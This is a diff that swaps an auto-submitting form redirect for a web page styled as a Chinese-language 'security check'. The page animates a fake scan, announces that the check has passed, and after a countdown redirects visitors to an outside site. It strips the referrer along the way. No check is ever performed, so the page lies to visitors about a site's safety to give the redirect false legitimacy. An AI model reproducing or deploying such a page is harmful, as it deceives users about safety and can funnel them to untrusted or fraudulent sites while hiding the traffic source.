@@ -1,2 +1,92 @@
-<form name="form1" action= https://s.clouderwork.com/article/03/b2/dc0f7a8c-9f13-49a8-b67d-e0df943b3ddd.html method="get"> </form> 
-<script language="javascript"> document.form1.submit() </script>
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge,chrome=1">
+</head>
+
+<body>
+<style type="text/css">
+  body{margin:0}.wxtip{background:rgba(0,0,0,.5);text-align:center;position:fixed;left:0;top:0;width:100%;height:100%;z-index:998;display:none}.wxtip-txt{margin-top:107px;color:#fff;font-size:16px;line-height:1.5}
+  @font-face {
+    font-weight: normal;
+    font-style: normal;
+    font-family: "weui"; }
+  [class^="weui-icon-"],
+  [class*=" weui-icon-"] {
+    display: inline-block;vertical-align: middle;font: normal normal normal 14px/1 "weui";
+    font-size: inherit;text-rendering: auto;-webkit-font-smoothing: antialiased;
+  &:before {display: inline-block;margin-left: .2em;margin-right: .2em;}
+  }
+  .weui-icon-waiting {background-image: url('17110593/-u7231.gif');background-size: contain;}
+  .weui-icon-success {background-image: url('17110593/-u6E90-u7801.png');background-size: contain;}
+  .weui-btn_primary{background-color:#1aad19}.weui-btn{position:relative;display:block;margin-left:auto;margin-right:auto;padding-left:14px;padding-right:14px;box-sizing:border-box;font-size:18px;text-align:center;text-decoration:none;color:#fff;line-height:2.55555556;border-radius:5px;-webkit-tap-highlight-color:rgba(0,0,0,0);overflow:hidden;margin-bottom:20px}.weui-btn_default{color:#000;background-color:#f8f8f8}.weui-icon-waiting{color:#10aeff}.weui-icon-success{color:#1aad19}.icon{font-size:93px;margin:20px auto}.actions{padding:10px 30px}.footer{position:absolute;bottom:0;width:100%;text-align:center;color:#999;font-size:12px}*{margin:0;padding:0}img{max-width:100%;height:auto}
+</style>
+<div style="text-align:center;padding:60px 10px 50px 10px;">
+  <i class="weui-icon-waiting icon" id="icon" style="width: 100px;height: 100px;"></i>
+  <p style="font-size:20px;color:#555;" id="iconText">正在安全检测</p>
+  <p style="font-size:13px;color:#999;" id="subText"></p>
+</div>
+<div class="actions" id="goHome">
+  <a href="http://www.2009o.com" class="weui-btn weui-btn_primary" id="openSchemeLink" style="">点击前往</a>
+</div>
+<div class="footer">
+  <p>Copyright © 2024 - <script>
+    document.write(new Date().getFullYear())
+  </script>. All Rights Reserved.</p>
+  <br>
+</div>
+<div id="jcdiv" style="position: absolute;bottom: 0;left: 0;width: 0;height: 0;overflow: hidden;"></div>
+<script>
+  var _ = 'http://www.2009o.com'; //网址
+  Times = 3000; //自动跳转,每1000就是1秒
+
+  console.log(_)
+  var a = document.getElementById('openSchemeLink'),
+          it = document.getElementById('iconText'),
+          jcdiv = document.getElementById('jcdiv');;
+  a.onclick = function () {
+    var ael = document.createElement('a');
+    ael.href = _;
+    ael.setAttribute('rel', 'noreferrer');
+    ael.click();
+    setTimeout(function () {
+      location.href = _;
+    }, 333);
+    return false;
+  }
+  var _i = 1;
+  var si = setInterval(function () {
+    var txt = '正在安全检测';
+    for (var i = 0; i < _i; i++) {
+      txt += '.';
+    }
+    it.innerText = txt;
+    if (++_i > 6) {
+      clearInterval(si);
+      var icon = document.getElementById('icon');
+      var subText = document.getElementById('subText');
+      icon.classList.add("weui-icon-success");
+      it.innerHTML = "已通过安全检测";
+      locationFn();
+
+    }
+  }, 220);
+
+  function locationFn() {
+    var uu = setInterval(function () {
+      subText.innerHTML = `${Times/1000}秒后跳转，如果没有自动跳转，请点击下方按钮`;
+      if (Times == 0) {
+        clearInterval(uu);
+        subText.innerHTML = "正在跳转，如果没有自动跳转，请点击下方按钮";
+        location.href = _;
+      }
+      Times -= 1000;
+    }, 1000);
+  }
+</script>
+</body>
+
+</html>
